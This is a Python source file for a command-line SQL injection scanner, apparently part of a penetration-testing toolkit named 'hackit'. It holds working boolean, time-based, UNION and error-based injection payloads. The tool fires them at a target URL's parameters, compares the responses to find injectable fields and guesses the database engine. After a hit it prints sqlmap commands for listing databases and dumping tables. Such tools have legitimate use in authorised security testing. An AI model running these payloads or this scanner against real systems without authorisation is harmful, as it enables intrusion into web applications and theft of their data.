"""
SQLi Boolean Tester - SQL Injection boolean-based detection
"""
import asyncio
import aiohttp
import json
import click
import time
from typing import List, Dict
import difflib
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from hackit.config import get_proxy, verify_ssl_default
from hackit.logger import get_logger

logger = get_logger(__name__)


def apply_tamper(payload: str, tamper_map: dict) -> str:
    """Simple tamper/transformation: replace substrings according to map."""
    out = payload
    for k, v in tamper_map.items():
        out = out.replace(k, v)
    return out


class SQLiBooleanTester:
    """Detect SQL injection using boolean-based techniques"""
    
    PAYLOADS = {
        "true_conditions": [
            "' OR '1'='1",
            "' OR 1=1--",
            "admin' --",
            "' OR 'a'='a",
            "1' OR '1'='1",
        ],
        "false_conditions": [
            "' AND '1'='2",
            "' AND 1=2--",
            "' AND 'a'='b",
            "1' AND '1'='2",
        ],
        "time_based": [
            "'; WAITFOR DELAY '00:00:05'--",
            "'; SELECT SLEEP(5)--",
            "' OR SLEEP(5)--",
        ]
    }
    # numeric payloads (no quotes)
    NUMERIC_PAYLOADS = {
        "true": [
            "1 OR 1=1-- ",
            "1 OR 1=1",
            "0 OR 1=1",
        ],
        "false": [
            "1 AND 1=2-- ",
            "1 AND 1=2",
        ],
        "time": [
            "1; SELECT SLEEP(5)--",
            "1 OR SLEEP(5)--",
        ]
    }

    SQL_ERRORS = [
        'you have an error in your sql syntax',
        'warning: mysql',
        'unclosed quotation mark after the character string',
        'quoted string not properly terminated',
        'pg_query(',
        'mysql_fetch',
        'syntax error at or near',
    ]

    # UNION-based payloads (generic)
    UNION_PAYLOADS = [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
    ]

    # Error-based payloads
    ERROR_PAYLOADS = [
        "' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--",
        "' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--",
        "' OR 1=CAST((SELECT database()) AS INT)--",
    ]

    # DB fingerprint markers
    DB_FINGERPRINTS = {
        'mysql': ['@@version', 'version()', 'mysql_fetch', 'mysql_query'],
        'postgres': ['pg_version', 'postgres', 'PQgetResult'],
        'mssql': ['@@version', 'sql server', 'sysobjects'],
        'oracle': ['v$instance', 'dbms_', 'from dual'],
    }
    
    def __init__(self, timeout: int = 10, retries: int = 1, delay: float = 0.0):
        self.timeout = timeout
        self.retries = retries
        self.delay = delay
        self.tamper_map = None
        self.detected_dbms = None
        self.vulnerable_param = None
        self.vulnerable_url = None
    
    def _build_injected_url(self, url: str, param: str, value: str) -> str:
        """Return URL with parameter replaced or added with given value."""
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        qs[param] = [value]
        new_qs = urlencode(qs, doseq=True)
        new_parts = (parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_qs, parsed.fragment)
        return urlunparse(new_parts)

    def _guess_dbms(self, response_text: str) -> str:
        """Guess DBMS from error messages or response keywords."""
        lower_resp = response_text.lower()
        for db, markers in self.DB_FINGERPRINTS.items():
            if any(marker.lower() in lower_resp for marker in markers):
                return db
        return 'unknown'

    async def enumerate_databases(self, session: aiohttp.ClientSession, url: str, param: str, original_value: str, method: str = 'GET', dbms: str = 'mysql') -> dict:
        """Display instructions for manual UNION-based enumeration."""
        # For real-world testing, UNION-based SQL injection requires:
        # 1. Knowing the number of columns in the original query
        # 2. Identifying data types of each column
        # 3. Crafting payloads to extract data
        # This is complex and varies by DBMS
        
        # We'll return a simple result that prompts the user to use sqlmap for full enumeration
        result = {"databases": {}, "dbms": dbms}
        result["message"] = "UNION-based enumeration requires manual testing or sqlmap"
        return result

    async def send_request(self, session: aiohttp.ClientSession, method: str, url: str, params: dict = None, data: dict = None, json_body: dict = None, proxy=None, ssl_param=None):
        method = method.upper()
        if method == 'GET':
            async with session.get(url, params=params, timeout=self.timeout, proxy=proxy, ssl=ssl_param) as r:
                return await r.text(), r.status
        elif method == 'POST':
            if json_body is not None:
                async with session.post(url, json=json_body, timeout=self.timeout, proxy=proxy, ssl=ssl_param) as r:
                    return await r.text(), r.status
            else:
                async with session.post(url, data=data, timeout=self.timeout, proxy=proxy, ssl=ssl_param) as r:
                    return await r.text(), r.status
        else:
            # fallback to GET
            async with session.get(url, params=params, timeout=self.timeout, proxy=proxy, ssl=ssl_param) as r:
                return await r.text(), r.status


    async def test_parameter_boolean(self, session: aiohttp.ClientSession,
                                     url: str, param: str,
                                     true_payload: str, false_payload: str,
                                     original_value: str = None, method: str = 'GET', content_type: str = 'form', original_body: str = None) -> dict:
        """Test parameter with boolean payloads"""
        try:
            proxy = get_proxy()
            verify = verify_ssl_default()
            ssl_param = None if verify else False

            # Baseline: request with original value (if present) or a safe control value
            base_val = original_value if original_value is not None else 'test'
            if method.upper() == 'GET':
                base_url = self._build_injected_url(url, param, base_val)
                base_content, base_status = await self.send_request(session, 'GET', base_url, params=None, proxy=proxy, ssl_param=ssl_param)
            else:
                # parse original_body into data/json
                base_url = url
                json_body = None
                data_body = None
                if content_type == 'json' and original_body:
                    try:
                        json_body = json.loads(original_body)
                    except Exception:
                        json_body = {param: base_val}
                else:
                    # parse k=v&amp;k2=v2
                    from urllib.parse import parse_qs
                    qs = parse_qs(original_body or '')
                    data_body = {k: v[0] for k, v in qs.items()} if qs else {param: base_val}
                    data_body[param] = base_val

                base_content, base_status = await self.send_request(session, 'POST', base_url, data=data_body, json_body=json_body, proxy=proxy, ssl_param=ssl_param)

            base_length = len(base_content)
            
            # Test with TRUE payload
            if method.upper() == 'GET':
                true_url = self._build_injected_url(url, param, true_payload)
                true_content, true_status = await self.send_request(session, 'GET', true_url, proxy=proxy, ssl_param=ssl_param)
            else:
                json_body = None
                data_body = None
                if content_type == 'json' and original_body:
                    try:
                        json_body = json.loads(original_body)
                    except Exception:
                        json_body = {param: true_payload}
                    json_body[param] = true_payload
                else:
                    from urllib.parse import parse_qs
                    qs = parse_qs(original_body or '')
                    data_body = {k: v[0] for k, v in qs.items()} if qs else {}
                    data_body[param] = true_payload
                true_content, true_status = await self.send_request(session, 'POST', url, data=data_body, json_body=json_body, proxy=proxy, ssl_param=ssl_param)
            true_length = len(true_content)

            # Test with FALSE payload
            if method.upper() == 'GET':
                false_url = self._build_injected_url(url, param, false_payload)
                false_content, false_status = await self.send_request(session, 'GET', false_url, proxy=proxy, ssl_param=ssl_param)
            else:
                json_body = None
                data_body = None
                if content_type == 'json' and original_body:
                    try:
                        json_body = json.loads(original_body)
                    except Exception:
                        json_body = {param: false_payload}
                    json_body[param] = false_payload
                else:
                    from urllib.parse import parse_qs
                    qs = parse_qs(original_body or '')
                    data_body = {k: v[0] for k, v in qs.items()} if qs else {}
                    data_body[param] = false_payload
                false_content, false_status = await self.send_request(session, 'POST', url, data=data_body, json_body=json_body, proxy=proxy, ssl_param=ssl_param)
            false_length = len(false_content)
            
            # Analyze responses
            true_diff = abs(true_length - base_length)
            false_diff = abs(false_length - base_length)

            # Heuristics: check status change, significant length diff, similarity, or SQL error strings
            sim = difflib.SequenceMatcher(None, true_content, false_content).ratio()
            sql_error_found = any(err in (true_content + false_content + base_content).lower() for err in self.SQL_ERRORS)

            if (true_status != false_status) or sql_error_found or abs(true_length - false_length) > max(20, base_length * 0.08) or sim < 0.9:
                return {
                    "parameter": param,
                    "vulnerable": True,
                    "true_response_len": true_length,
                    "false_response_len": false_length,
                    "base_response_len": base_length,
                    "true_payload": true_payload,
                    "false_payload": false_payload,
                    "similarity": sim,
                    "true_status": true_status,
                    "false_status": false_status,
                    "base_status": base_status,
                    "sql_error": sql_error_found,
                }
            
            return {
                "parameter": param,
                "vulnerable": False,
                "true_response_len": true_length,
                "false_response_len": false_length,
                "base_response_len": base_length,
                "similarity": sim,
                "true_status": true_status,
                "false_status": false_status,
            }
        
        except Exception as e:
            logger.debug('sqli boolean test error for %s param %s: %s', url, param, e)
            return {"parameter": param, "error": str(e)}

    async def test_parameter_time(self, session: aiohttp.ClientSession, url: str, param: str, payload: str, threshold: float = 3.0) -> dict:
        """Test for time-based SQLi by measuring response latency"""
        try:
            proxy = get_proxy()
            verify = verify_ssl_default()
            ssl_param = None if verify else False

            params_control = {param: 'test'}
            t0 = time.monotonic()
            async with session.get(url, params=params_control, timeout=self.timeout, proxy=proxy, ssl=ssl_param) as r:
                await r.text()
            t_control = time.monotonic() - t0

            # time payload
            # inject payload similar to boolean tests (respect tamper)
            if self.tamper_map:
                payload = apply_tamper(payload, self.tamper_map)

            params_time = {param: payload}
            t1 = time.monotonic()
            async with session.get(url, params=params_time, timeout=self.timeout + threshold, proxy=proxy, ssl=ssl_param) as r:
                await r.text()
            t_payload = time.monotonic() - t1

            logger.debug('time test %s control=%.2f payload=%.2f', url, t_control, t_payload)

            if t_payload - t_control >= threshold:
                return {"parameter": param, "vulnerable": True, "type": "time-based", "control_time": t_control, "payload_time": t_payload, "payload": payload}
            return {"parameter": param, "vulnerable": False, "control_time": t_control, "payload_time": t_payload}
        except Exception as e:
            logger.debug('sqli time test error for %s param %s: %s', url, param, e)
            return {"parameter": param, "error": str(e)}
    
    async def scan(self, url: str, params: List[str], method: str = 'GET', content_type: str = 'form', original_body: str = None) -> List[dict]:
        """Scan for SQL injection"""
        connector = aiohttp.TCPConnector(limit_per_host=10)
        timeout_obj = aiohttp.ClientTimeout(total=self.timeout)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout_obj, trust_env=True) as session:
            results = []
            
            for param in params:
                # Determine if original param appears numeric to try numeric payloads first
                parsed = urlparse(url)
                qs = parse_qs(parsed.query)
                orig_val = None
                if param in qs and len(qs[param]) > 0:
                    orig_val = qs[param][0]
                is_numeric = orig_val.isdigit() if orig_val is not None else False

                # Boolean tests
                if is_numeric:
                    for t_payload, f_payload in zip(self.NUMERIC_PAYLOADS['true'], self.NUMERIC_PAYLOADS['false']):
                        # apply tamper mapping if present
                        if self.tamper_map:
                            t_payload = apply_tamper(t_payload, self.tamper_map)
                            f_payload = apply_tamper(f_payload, self.tamper_map)
                        result = await self.test_parameter_boolean(session, url, param, t_payload, f_payload, original_value=orig_val, method=method, content_type=content_type, original_body=original_body)
                        results.append(result)
                        if result.get('vulnerable'):
                            logger.info('Potential numeric boolean SQLi found on %s parameter %s', url, param)
                            break
                else:
                    for i, true_payload in enumerate(self.PAYLOADS["true_conditions"]):
                        false_payload = self.PAYLOADS["false_conditions"][i] if i < len(self.PAYLOADS["false_conditions"]) else self.PAYLOADS["false_conditions"][0]

                        if self.tamper_map:
                            tp = apply_tamper(true_payload, self.tamper_map)
                            fp = apply_tamper(false_payload, self.tamper_map)
                        else:
                            tp = true_payload
                            fp = false_payload

                        result = await self.test_parameter_boolean(session, url, param, tp, fp, original_value=orig_val, method=method, content_type=content_type, original_body=original_body)
                        results.append(result)

                    if result.get("vulnerable"):
                        logger.info('Potential boolean SQLi found on %s parameter %s', url, param)
                        break

                # Time-based tests
                # Time-based tests: use numeric time payloads for numeric params
                time_payloads = self.PAYLOADS.get('time_based', [])
                if is_numeric:
                    time_payloads = time_payloads + self.NUMERIC_PAYLOADS.get('time', [])

                for payload in time_payloads:
                    t_res = await self.test_parameter_time(session, url, param, payload)
                    results.append(t_res)
                    if t_res.get("vulnerable"):
                        logger.info('Potential time-based SQLi found on %s parameter %s', url, param)
                        break
            
            return results


@click.command()
@click.option('-u', '--url', 'url', required=True, help='Target URL (e.g., http://example.com/page.php?id=1)')
@click.option('-p', '--params', 'params', required=True, help='Parameters to test (comma-separated)')
@click.option('--method', default='GET', type=click.Choice(['GET', 'POST'], case_sensitive=False), help='HTTP method to use')
@click.option('--data', default=None, help='Request body (form-encoded: key=val&k2=v2 or raw JSON)')
@click.option('--content-type', default='form', type=click.Choice(['form', 'json'], case_sensitive=False), help='Content type for body when using POST')
@click.option('--technique', default='B,T,E', help='Techniques to use (B=boolean,T=time,E=error) e.g. B,T')
@click.option('--level', default=1, type=int, help='Level of tests to perform (1-5) influences payload depth)')
@click.option('--risk', default=1, type=int, help='Risk of tests to perform (1-3) influences time-based / intrusive checks)')
@click.option('--threads', default=10, type=int, help='Number of concurrent requests/threads')
@click.option('--tamper', default=None, help='Tamper file (JSON mapping to transform payloads)')
@click.option('--batch', is_flag=True, help='Non-interactive; accept default choices')
@click.option('--timeout', default=10, type=int, help='Request timeout')
@click.option('--retries', default=1, type=int, help='Number of retries for requests')
@click.option('--delay', default=0.0, type=float, help='Delay between tests (seconds)')
@click.option('--payload-file', default=None, help='Custom payload file (JSON with true_conditions, false_conditions, time_based)')
@click.option('--output', default=None, help='Save results to JSON')
def test_sqli(url, params, method, data, content_type, technique, level, risk, threads, tamper, batch, timeout, retries, delay, payload_file, output):
    """Test for SQL injection using boolean techniques"""
    
    param_list = [p.strip() for p in params.split(',')]
    
    tester = SQLiBooleanTester(timeout=timeout, retries=retries, delay=delay)
    # concurrency tuning
    tester.threads = threads

    # load tamper mapping
    if tamper:
        try:
            with open(tamper, 'r') as f:
                tester.tamper_map = json.load(f)
        except Exception as e:
            click.echo(f"[!] Failed to load tamper file: {e}")

    if payload_file:
        try:
            with open(payload_file, 'r') as f:
                data = json.load(f)
                tester.PAYLOADS.update(data)
        except Exception as e:
            click.echo(f"[!] Failed to load payload file: {e}")
    
    click.echo(f"[*] Testing for SQL injection: {url}")
    click.echo(f"[*] Parameters: {param_list}")
    click.echo(f"[*] Method: {method} Content-Type: {content_type}")

    results = asyncio.run(tester.scan(url, param_list, method=method, content_type=content_type, original_body=data))
    
    # Filter vulnerable
    vulnerable = [r for r in results if r.get("vulnerable")]
    
    click.echo(f"\n[+] Results:")
    click.echo(f"    Total tests: {len(results)}")
    click.echo(f"    Vulnerable: {len(vulnerable)}")
    
    if vulnerable:
        click.echo(f"\n[!] POTENTIAL SQL INJECTION FOUND:")
        for result in vulnerable:
            click.echo(f"    Parameter: {result.get('parameter')}")
            if result.get('type') == 'time-based':
                click.echo(f"    Type: time-based (payload: {result.get('payload')})")
                click.echo(f"    Control time: {result.get('control_time'):.2f}s")
                click.echo(f"    Payload time: {result.get('payload_time'):.2f}s")
                click.echo()
            else:
                tr = result.get('true_response_len')
                fr = result.get('false_response_len')
                if tr is not None and fr is not None:
                    click.echo(f"    True response: {tr} bytes")
                    click.echo(f"    False response: {fr} bytes")
                    click.echo(f"    Difference: {abs(tr - fr)} bytes")
                if result.get('similarity') is not None:
                    click.echo(f"    Similarity: {result['similarity']:.2%}")
                if result.get('sql_error'):
                    click.echo(f"    SQL error pattern detected in response")
                click.echo()
        
        # Try to enumerate database if vulnerability found
        click.echo(f"\n[*] Attempting database enumeration...")
        parsed_url = urlparse(url)
        qs = parse_qs(parsed_url.query)
        param_to_exploit = params.split(',')[0].strip()
        orig_val = qs.get(param_to_exploit, ['1'])[0] if param_to_exploit in qs else '1'
        
        try:
            # Guess DBMS from first finding
            first_result = vulnerable[0]
            response_sample = first_result.get('true_payload', '')
            dbms = tester._guess_dbms(response_sample)
            if dbms == 'unknown':
                dbms = 'mysql'  # default
            
            click.echo(f"[*] Detected DBMS: {dbms}")
            
            # Run enumeration in async context
            async def run_enum():
                connector = aiohttp.TCPConnector(limit_per_host=10)
                timeout_obj = aiohttp.ClientTimeout(total=timeout)
                async with aiohttp.ClientSession(connector=connector, timeout=timeout_obj, trust_env=True) as session:
                    enum_result = await tester.enumerate_databases(session, url, param_to_exploit, orig_val, method=method, dbms=dbms)
                    return enum_result
            
            enum_result = asyncio.run(run_enum())
            
            if "databases" in enum_result and enum_result["databases"]:
                click.echo(f"\n[+] DATABASE ENUMERATION:\n")
                for db_name, db_info in enum_result["databases"].items():
                    if db_name.startswith('('):
                        click.echo(f"[*] {db_name}")
                    else:
                        click.echo(f"[+] Database: {db_name}")
                        click.echo(f"    Tables:")
                        for table_name, table_info in db_info.get("tables", {}).items():
                            click.echo(f"      | {table_name}")
                            if table_info.get("columns"):
                                click.echo(f"      | +-- Columns: {', '.join(table_info['columns'])}")
                click.echo()
            
            if enum_result.get("message"):
                click.echo(f"\n[!] {enum_result['message']}")
                click.echo(f"\n[*] To perform full database enumeration, use sqlmap:")
                click.echo(f"    sqlmap -u '{url}' -p {params} --dbs")
                click.echo(f"    sqlmap -u '{url}' -p {params} -D database_name --tables")
                click.echo(f"    sqlmap -u '{url}' -p {params} -D database_name -T table_name --dump")
                click.echo()
        except Exception as e:
            logger.debug('enumeration error: %s', e)
    else:
        click.echo(f"\n[+] No SQL injection detected")
    
    if output:
        with open(output, 'w') as f:
            json.dump({
                "url": url,
                "vulnerable": len(vulnerable),
                "results": results
            }, f, indent=2, default=str)
        click.echo(f"\n[+] Results saved to {output}")


if __name__ == "__main__":
    test_sqli()
